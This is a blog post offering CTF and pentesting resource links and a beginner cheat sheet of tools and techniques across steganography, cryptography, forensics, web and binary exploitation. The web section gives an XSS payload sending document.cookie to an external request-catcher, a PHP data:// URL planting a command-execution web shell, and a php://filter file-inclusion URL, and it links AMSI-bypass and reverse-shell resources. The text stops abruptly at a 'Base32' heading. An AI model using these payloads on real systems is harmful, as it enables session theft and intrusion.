---
layout: post
title:  "CTF"
date:   2024-08-08 12:32:45 +0100
categories:
---

- [Videos](#videos)


# CTF
**[CTFTime](https://ctftime.org)**<br>
**[OverTheWire](https://overthewire.org/wargames)**<br>
**[PicoCTF](https://play.picoctf.org)**<br>
**[ImaginaryCTF](https://imaginaryctf.org)**<br>
**[247CTF](https://247ctf.com)**<br>
**[CTF Challenge](https://ctfchallenge.com)**<br>
**[CTF Learn](https://ctflearn.com)**<br>
**[CryptoHack](https://cryptohack.org)**<br>
**[HackThisSite](https://www.hackthissite.org)**<br>
**[SmashTheStack](http://smashthestack.org/wargames.html)**<br>
**[W3Challs](https://w3challs.com/challenges)**<br>
**[Ringzer0CTF](https://ringzer0ctf.com/challenges)**<br>
**[Enigma Group](https://www.enigmagroup.org)**<br>
**[Root Me](https://www.root-me.org)**

# Pentesting
**[HackTheBox](https://app.hackthebox.eu)**<br>
**[TryHackMe](https://tryhackme.com)**<br>
**[OffSec Proving Grounds](https://www.offensive-security.com/labs)**<br>
**[Web Security Academy](https://portswigger.net/web-security)**<br>
**[Damn Vulnerable Web Application](https://github.com/digininja/DVWA)**<br>
**[OWASP Juice Shop](https://github.com/juice-shop/juice-shop-ctf)**<br>
**[Hacker 101](https://ctf.hacker101.com)**<br>
**[PentesterLab](https://pentesterlab.com)**<br>
**[VulnHub](https://www.vulnhub.com)**<br>
**[VulnMachines](https://www.vulnmachines.com)**<br>
**[HackingLab](https://www.hacking-lab.com/index.html)**<br>
**[CyberSecLabs](https://www.cyberseclabs.co.uk)**<br>
**[HackXOR](https://hackxor.net)**<br>
**[Hacktoria](https://hacktoria.com)**

# Pwn / RE
**[Pwn.College](https://pwn.college)**<br>
**[ROP Emporium](https://ropemporium.com)**<br>
**[Exploit Education](https://exploit.education)**<br>
**[How2Heap](https://github.com/shellphish/how2heap)**<br>
**[Pwnables](https://pwnable.tw/challenge)**<br>
**[Deusx64](https://deusx64.ai)**<br>
**[Roppers Academy](https://roppers.org/collections)**<br>
**[Azeria Labs](https://azeria-labs.com/writing-arm-assembly-part-1)**<br>
**[Reversing Challenges](https://challenges.re)**<br>
**[Begin RE](https://www.begin.re)**<br>
**[CrackMes](https://crackmes.one)**

# Blue Team
**[LetsDefend](https://letsdefend.io)**<br>
**[Blue Team Labs Online](https://blueteamlabs.online)**<br>
**[Cyber Defenders](https://cyberdefenders.org)**<br>
**[Attack Defense](https://attackdefense.com)**<br>
**[Immersive Labs](https://dca.immersivelabs.online)**

# Videos
{:#videos}

**[LiveOverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)**<br>
**[John Hammond](https://www.youtube.com/c/JohnHammond010)**<br>
**[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)**<br>
**[XCT](https://www.youtube.com/channel/UClGm2C8Qi0_Wv68zfjCz2YA)**<br>
**[Gynvael](https://www.youtube.com/user/GynvaelEN)**<br>
**[ZetaTwo](https://www.youtube.com/c/ZetaTwo)**<br>
**[PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)**<br>
**[0xdf](https://www.youtube.com/channel/UChO9OAH57Flz35RRX__E25A)**<br>
**[247CTF](https://www.youtube.com/channel/UCtGLeKomT06x3xZ2SZp2l9Q)**<br>
**[MalFind](https://www.youtube.com/channel/UCJf4-reOhoiAlScWC1WzLgQ)**<br>
**[DayZeroSec](https://www.youtube.com/c/dayzerosec)**<br>
**[Rana Khalil](https://www.youtube.com/c/RanaKhalil101)**<br>
**[PinkDraconian](https://www.youtube.com/channel/UCmXwpkCXmIKjoRLMsq9I3RA)**<br>
**[Superhero1](https://www.youtube.com/channel/UCm2SwKmx3Ya1HG5RmHR7SCA)**<br>
**[S1lk](https://www.youtube.com/c/AlexChaveriat)**<br>
**[Alh4zr3d](https://www.youtube.com/channel/UCz-Z-d2VPQXHGkch0-_KovA)**<br>
**[Pawe≈Ç ≈Åukasik](https://www.youtube.com/c/PawelLukasik)**<br>
**[Ephemeral](https://www.youtube.com/c/BasteG0d69)**<br>
**[Hak5](https://www.youtube.com/c/hak5)**<br>
**[Conda](https://www.youtube.com/c/c0nd4)**<br>
**[HackerSploit](https://www.youtube.com/c/HackerSploit)**<br>
**[Condingo](https://www.youtube.com/c/codingo)**<br>
**[InsiderPhd](https://www.youtube.com/c/InsiderPhD)**<br>
**[HackSplained](https://www.youtube.com/c/Hacksplained)**<br>
**[TheCyberMentor](https://www.youtube.com/c/TheCyberMentor)**<br>
**[StackSmashing](https://www.youtube.com/c/stacksmashing)**<br>
**[Cybersecurity Meg](https://www.youtube.com/c/CybersecurityMeg)**<br>
**[Tib3rius](https://www.youtube.com/c/Tib3rius)**<br>
**[SecAura](https://www.youtube.com/channel/UCx89Lz24SEPZpExl6OfQ0Gg)**<br>
**[DarkSec](https://www.youtube.com/c/DarkSec)**<br>
**[Hexorcist](https://www.youtube.com/c/HEXORCIST)**<br>
**[PwnCollege](https://www.youtube.com/c/pwncollege)**<br>
**[NahamSec](https://www.youtube.com/c/Nahamsec)**<br>
**[Optional](https://www.youtube.com/c/optionalctf)**<br>
**[TheHackerish](https://www.youtube.com/c/thehackerish)**<br>
**[Ryan Gordon](https://www.youtube.com/c/0xRy4n)**<br>
**[AlmondForce](https://www.youtube.com/c/AlmondForce)**<br>
**[VulnMachines](https://www.youtube.com/c/vulnmachines)**<br>
**[Others](https://securitycreators.video)**

# Tools
**[Ghidra](https://ghidra.re/CheatSheet.html)**<br>
**[Volatility](https://github.com/volatilityfoundation/volatility/wiki/Linux)**<br>
**[PwnTools](https://github.com/Gallopsled/pwntools-tutorial)**<br>
**[CyberChef](https://gchq.github.io/CyberChef)**<br>
**[DCode](https://www.dcode.fr/en)**<br>
**[Decompile Code](https://www.decompiler.com)**<br>
**[Run Code](https://tio.run)**<br>
**[GTFOBins](https://gtfobins.github.io)**<br>
**[ExploitDB](https://www.exploit-db.com)**<br>
**[RevShells](https://revshells.com)**

# More Resources
**[Bug Bounty Platforms](https://github.com/disclose/bug-bounty-platforms)**<br>
**[HackTricks](https://book.hacktricks.xyz/pentesting-methodology)**<br>
**[CTF Resources](https://github.com/apsdehal/awesome-ctf)**<br>
**[Security Resources](https://github.com/CompassSecurity/security_resources)**<br>
**[Bug Bounty Resources](https://www.hacker101.com/resources)**<br>
**[Seal9055 Resources](https://github.com/seal9055/resources)**<br>
**[Forensics](https://cugu.github.io/awesome-forensics)**<br>
**[Learn RE](https://hshrzd.wordpress.com/how-to-start)**<br>
**[Learn BinExp](https://guyinatuxedo.github.io)**<br>
**[HTB Writeups](https://0xdf.gitlab.io)**

Welcome to the world of CTFs üè¥‚Äç‚ò†Ô∏è

--------------------------

This is an introduction to some of the basics of each category. It was designed to help beginners and old comrades, enjoy the ride and "Pwn Every CTF".


Esoteric Languages
-----------------------

* [https://tio.run/](https://tio.run/)

	An online tool that has a ton of Esoteric language interpreters. 

* Brainfuck

	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
--.++++++++++++.--------.<------------.<++.>>----.+.<+++++++++++.+++++++++++++.>+++++++++++++++++.-------------
--.++++.+++++++++++++++.<<.>>-------.<+++++++++++++++.>+++..++++.--------.+++.<+++.<++++++++++++++++++++++++++
.<++++++++++++++++++++++.>++++++++++++++..>+.----.>------.+++++++.--------.<+++.>++++++++++++..-------.++.
```

* [Malboge]

	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Example code:

```
(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
```

* [Piet]

	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)


* [Ook!](http://esolangs.org/wiki/ook!)

	A joke language. Recognizable by `.` and `?`, and `!`.
	
* Hexahue Cipher

![](https://miro.medium.com/max/465/1*QY8sg087QQwXOoS3Cu1cWg.jpeg)


https://www.dcode.fr/hexahue-cipher
```
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
```

Steganography
---------------------

* [StegCracker][StegCracker]

	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker` above.

* [`openstego`][OpenStego]

	A [Java][Java] [`.JAR`][JAR] tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the [Misc50](http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/) challenge from [HackIM 2018](https://ctftime.org/event/566)

* [`Stegsolve.jar`][Stegsolve.jar]

	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.

* [`steghide`][steghide]

	A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge. 

* [`zsteg`][zsteg]

	Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.

* [`jsteg`][jsteg]

    Another command-line tool to use against JPEG images. [https://github.com/lukechampine/jsteg](https://github.com/lukechampine/jsteg) Handy for Hackerrank Codefest CTF 2018.

* [Jstego][Jstego]

    A GUI tool for JPG steganography. [https://sourceforge.net/projects/jstego/](https://sourceforge.net/projects/jstego/) It is a [Java][Java] [JAR] file similar to stegsolve.jar

* Morse Code

	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html) 	

* Whitespace

	Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with [`snow`][snow] or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* DNA Codes

    When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:

    ![img/dna_codes.png](img/dna_codes.png)
    ![img/genome_coding.jpg](img/genome-coding.jpg)

* [`snow`][snow]

	A command-line tool for whitespace steganography (see above).

* SONIC Visualizer (audio spectrum)

	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__

* [Detect DTMF Tones]

	Audio frequencies common to a phone button, DTMF: [https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

* Phone-Keypad

	Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`][hipshot]

	A [Python] module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a [QR code] visible in a video, displayed through "Star Wars" style text motion.	

* [QR code]

	A small square "barcode" image that holds data.

* [`zbarimg`][zbarimg]

	A command-line tool to quickly scan multiple forms of barcodes, [QR codes] included. Installed like so on a typical [Ubuntu] image: 

```
sudo apt install zbar-tools
```
	
* Punctuation marks `!`, `.` and `?`

	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!

Cryptography
-----------------


* Keyboard Shift
	
	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...

* Bit Shift

	Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).

* Reversed Text

	Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python] like so:

```
"UOYMORFEDIHOTGNIYRTEBTHGIMFTCATAHTTERCESASISIHT"[::-1]
```

* XOR

	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):

	``` python
	python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
	```


* Caesar Cipher

	The most classic shift cipher. Tons of online tools like this: [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher) or use `caesar` as a command-line tool (`sudo apt install bsdgames`) and you can supply a key for it. Here's a one liner to try all letter positions:

	```
	cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
	```

	__Be aware!__ Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!

* `caesar`

	A command-line caesar cipher tool (noted above) found in the `bsdgames` package.

* [Atbash Cipher]

	If you have some text that you have no idea what it is, try the [Atbash cipher]! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python].

* [Vigenere Cipher]

	[http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx), [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) and personal Python code here: [https://pastebin.com/2Vr29g6J](https://pastebin.com/2Vr29g6J)

* Beaufourt Cipher

	[https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)


* Python random module cracker/predictor

	[https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module. 

* Transposition Cipher

* RSA: Classic RSA

	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)

* RSA: Multi-prime RSA

* RSA: `e` is 3 (or small)

	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python] code to take the cubed root:

```
def root3rd(x):
    y, y1 = None, 2
    while y!=y1:
        y = y1
        y3 = y**3
        d = (2*y3+x)
        y1 = (y*(y3+2*x)+d//2)//d
    return y 
``` 

* RSA: Weiner's Little D Attack

	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)

* RSA: Chinese Remainder Attack

	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)

* [LC4]

	This is an adaptation of RC4... just not. There is an implementation available in Python.
	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)

* Elgamal

* Affine Cipher

* Substitution Cipher (use quip quip!)

	[https://quipqiup.com/](https://quipqiup.com/)

* Railfence Cipher

	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)


* [Playfair Cipher]

	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)

* Polybius Square

	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)

* The Engima

	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)

* AES ECB

	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length. 


* Two-Time Pad

	

Networking
---------------

* [Wireshark]

	The go-to tool for examining [`.pcap`][PCAP] files. 

* [Network Miner]

	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP] and [PCAPNG] files.

* [PCAPNG]

	Not all tools like the [PCAPNG] file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:

```
editcap old_file.pcapng new_file.pcap
```

* [`tcpflow`][tcpflow]

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__ 

```
tcpflow -r my_file.pcap
ls -1t | head -5 # see the last 5 recently modified files
```



* [PcapXray]

	A GUI tool to visualize network traffic.

PHP
------------

* Magic Hashes

	A common vulnerability in [PHP] that fakes hash "collisions..." where the `==` operator falls short in [PHP] type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.

| Plaintext | MD5 Hash |
| --------- | -------- |
|240610708|0e462097431906509019562988736854|
|QLTHNDT|0e405967825401955372549139051580|
|QNKCDZO|0e830400451993494058024219903391|
|PJNPDWY|0e291529052894702774557631701704|
|NWWKITQ|0e763082070976038347657360817689|
|NOOPCJF|0e818888003657176127862245791911|
|MMHUWUV|0e701732711630150438129209816536|
|MAUXXQC|0e478478466848439040434801845361|
|IHKFRNS|0e256160682445802696926137988570|
|GZECLQZ|0e537612333747236407713628225676|
|GGHMVOE|0e362766013028313274586933780773|
|GEGHBXL|0e248776895502908863709684713578|
|EEIZDOI|0e782601363539291779881938479162|
|DYAXWCA|0e424759758842488633464374063001|
|DQWRASX|0e742373665639232907775599582643|
|BRTKUJZ|00e57640477961333848717747276704|
|ABJIHVY|0e755264355178451322893275696586|
|aaaXXAYW|0e540853622400160407992788832284|
|aabg7XSs|0e087386482136013740957780965295|
|aabC9RqS|0e041022518165728065344349536299|

| Plaintext | SHA1 Hash |
| --------- | --------- |
|aaroZmOk|0e66507019969427134894567494305185566735|
|aaK1STfY|0e76658526655756207688271159624026011393|
|aaO8zKZF|0e89257456677279068558073954252716165668|
|aa3OFF9m|0e36977786278517984959260394024281014729|


* `preg_replace`

	A bug in older versions of [PHP] where the user could get remote code execution
	
	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)


* [`phpdc.phpr`][phpdc.phpr]

	A command-line tool to decode [`bcompiler`][bcompiler] compiled [PHP] code.


* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

	A bug in [PHP] where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

```
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```


* `data://text/plain;base64`

	A [PHP] stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:

```
http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
``` 


PDF Files
-------------

* `pdfinfo`	
	
	A command-line tool to get a basic synopsis of what the [PDF] file is.

* `pdfcrack`

	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.

* `pdfimages`

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* [`pdfdetach`][pdfdetach]

	A command-line tool to extract files out of a [PDF].


Forensics
-----------


* [Magic Numbers]

	The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their [magic number] with a [trusted list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

* [`hexed.it`][hexed.it]

	An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt [magic number]

* [`dumpzilla`][dumpzilla]

	A [Python] script to examine a `.mozilla` configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:

```
python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
```


* Repair image online tool

    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)


* `foremost`

	A command-line tool to carve files out of another file. Usage is `foremost [filename]` and it will create an `output` directory.

```
sudo apt install foremost
```

* `binwalk`

	A command-line tool to carve files out of another file. Usage to extract is `binwalk -e [filename]` and it will create a `_[filename]_extracted` directory.

```
	sudo apt install binwalk
```


* [`hachoir-subfile`][hachoir-subfile]

	A command-line tool to carve out files of another file. Very similar to the other tools like `binwalk` and `foremost`, but always try everything!


* [TestDisk]

	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.


PNG File Forensics
--------------------


* `pngcheck`

	A command-line tool for "checking" a [PNG] image file. Especially good for verifying checksums.


APK Forensics
---------------

* [`apktool`][apktool]

	A command-line tool to extract all the resources from an APK file. Usage:

```
apktool d <file.apk>
```


* [`dex2jar`][dex2jar]

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* [`jd-gui`][jd-gui]

	A GUI tool to decompile Java code, and JAR files.
	

Web
----------------

* `robots.txt`

	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)

* [Edit This Cookie]

	A web browser plug-in that offers an easy interface to modifying [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___

* Backup pages ( `~` and `.bak` and `.swp` )

	Some times you may be able to dig up an old version of a webpage (or some PHP source code!) by adding the usual backup suffixes. A good thing to check!

* `/admin/`

	This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.

* `/.git/`
	
	A classic CTF challenge is to leave a `git` repository live and available on a website. You can see this with `nmap -A` (or whatever specific script catches it) and just by trying to view that specific folder, `/.git/`. A good command-line tool for this is [`GitDumper.sh`](https://github.com/internetwache/GitTools), or just simply using [`wget`][wget].

* [`GitDumper.sh`][GitDumper.sh]
	
	A command-line tool that will automatically scrape and download a [git] repository hosted online with a given URL.

* [XSS]/[Cross-site scripting]

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:

```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.

```
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
	
``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper() 
print scraper.get(url).content 
```

* [XSStrike]

	A command-line tool for automated [XSS] attacks. Seems to function like how [sqlmap] does.

* [`wpscan`][wpscan]

	* A Ruby script to scan and do reconnaissance on a [Wordpress] application. 
	
* Cookie Catcher

* [`requestb.in`](https://requestb.in/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`hookbin.com`](https://hookbin.com/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`sqlmap`][sqlmap]

	A command-line tool written in [Python] to automatically detect and exploit vulnerable SQL injection points.	

* Flask Template Injection

	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)


* SQL `IF` statements

	These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like `SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )`

* Explicit SQL Injection

	

* Blind SQL Injection

	


* gobuster
	
	

* DirBuster

* `nikto`


* Burpsuite
	


Reverse Engineering
-------------------

* `ltrace` and `strace`

	Easy command-line tools to see some of the code being executed as you follow through a binary. Usage: `ltrace ./binary`

* Hopper

* Binary Ninja

* gdb

* IDA




PowerShell
-------------

* [nishang]

	A PowerShell suite of tools for pentesting. Has support for an ICMP reverse shell!

* [Empire]

	HUGE PowerShell library and tool to do a lot of post-exploitation.

* [Bypass AMSI Anti-Malware Scan Interface](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html?mkt_tok=eyJpIjoiWTJGaU5qbGlaVFZsTXpVdyIsInQiOiJBSXdzQm5FMGY0S1BrTWlBcVBlZ3ErN2NcL1RNeGkwcnNSK3FZcGVvaUhFRVJiQUhVcmVIWko0aWdNNCtXcVRrcWtDRTMxRGlpM1wvQlIxVHZlU1RUNk5sRVJnQ1dUZEFVQ0JTRHk4ejNVQTBWK1Y3Um1EWHZYdGY5YWQ5V2hTZFVXIn0%3D)

	Great tool and guide for anti-virus evasion with PowerShell.


Windows Executables
-------------

* [`pefile`][pefile]

	A [Python] module that examines the headers in a Windows [PE (Portable Executable)][PE] file. 

* [dnSpy]

	A [Windows] GUI tool to decompile and reverse engineer [.NET] binaries

* [PEiD][PEiD]

	A [Windows] tool to detect common packers, cryptors and compilers for [Windows][Windows] [PE][PE] 

* jetBrains .NET decompiler

* AutoIT converter

	When debugging AutoIT programs, you may get a notification: "This is a compiled AutoIT script". Here is a good thing to use to decode them: [https://www.autoitscript.com/site/autoit/downloads/](https://www.autoitscript.com/site/autoit/downloads/)
	
Python Reversing
------------

* [Easy Python Decompiler]

	A small `.exe` GUI application that will "decompile" [Python] bytecode, often seen in `.pyc` extension. The tool runs reliably on [Linux] with [Wine].



Binary Exploitation/pwn
--------------

* Basic Stack Overflow

	Use `readelf -s <binary>` to get the location of a function to jump to -- overflow in Python, find offset with `dmesg`, and jump.	

* `printf` vulnerability

	A C binary vulnerability, where `printf` is used with user-supplied input without any arguments. Hand-made code to exploit and overwrite functions: [https://pastebin.com/0r4WGn3D](https://pastebin.com/0r4WGn3D) and a video walkthrough explaining: [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)

* [`formatStringExploiter`][formatStringExploiter]

	A good [Python] module to streamline exploiting a [format string vulnerability]. THIS IS NOT ALWAYS A GOOD TACTIC...

* 64-bit Buffer Overflow

	64-bit buffer overflow challenges are often difficult because the null bytes get in the way of memory addresses (for the function you want to jump to, that you can usually find with `readelf -s`). But, check if whether or not the function address you need starts with the same hex values already on the stack (in `rsp`). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address. 


VisualBasicScript Reversing
---------------------------


Miscellaneous
----------



* [Base64], [Base32], [Base85]

```
Base64:
TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlz
IHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2Yg
dGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGlu
dWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRo
ZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4=
```

```
Base32
